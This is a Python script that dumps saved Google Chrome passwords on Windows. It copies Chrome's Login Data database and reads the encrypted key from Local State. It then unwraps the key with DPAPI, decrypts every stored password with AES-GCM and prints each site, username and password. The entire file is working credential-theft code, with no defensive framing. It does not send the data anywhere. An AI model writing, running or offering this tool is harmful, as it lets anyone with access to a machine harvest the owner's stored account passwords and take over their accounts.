import os
import shutil
import sqlite3
import win32crypt #pip install pywin32
import json
import base64
import ctypes
import sys
from Crypto.Cipher import AES #pip install pycryptodome
import datetime

def get_chrome_do_path():
    path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    return path 
def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(local_state_path, 'r', encoding= 'utf-8') as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    key = key[5:]#Remove DPAPI
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode() #Remove suffix
    except Exception as e:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode() #old version
        except:
            return ""
        
def extract_passwords():
    db_path = get_chrome_do_path()
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename) #copy DB so Chrome doesn't lock it
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")
    key = get_encryption_key()

    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key)

        if username or decrypted_password:
            print(f"URL: {url}")
            print(f"Username: {username}")
            print(f"Password: {decrypted_password}")
            print("="*50)

    cursor.close()
    db.close()
    os.remove(filename)

if __name__ == "__main__":
    extract_passwords()
    
